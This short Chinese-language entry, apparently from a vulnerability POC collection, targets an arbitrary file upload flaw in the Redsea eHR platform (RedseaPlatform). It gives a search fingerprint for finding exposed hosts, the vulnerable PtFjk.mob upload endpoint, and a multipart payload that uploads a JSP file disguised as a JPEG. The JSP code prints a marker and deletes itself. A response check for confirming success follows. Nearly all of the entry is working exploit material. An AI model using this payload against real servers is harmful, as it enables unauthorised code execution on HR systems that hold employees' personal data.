# 红海云ehr-RedseaPlatform-文件上传-PtFjk

红海云ehr-RedseaPlatform ｜ 文件上传 ｜ —
- **指纹**：`body="RedseaPlatform"`
- **请求**：`POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1`

**Payload**
```
-----------------------------3dtd6inedsrglfna4uqp
Content-Disposition: form-data; name="fj_file"; filename="dudesite.jsp"
Content-Type: image/jpeg
<% out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-----------------------------3dtd6inedsrglfna4uqp--
```
- **响应特征**：200 savePath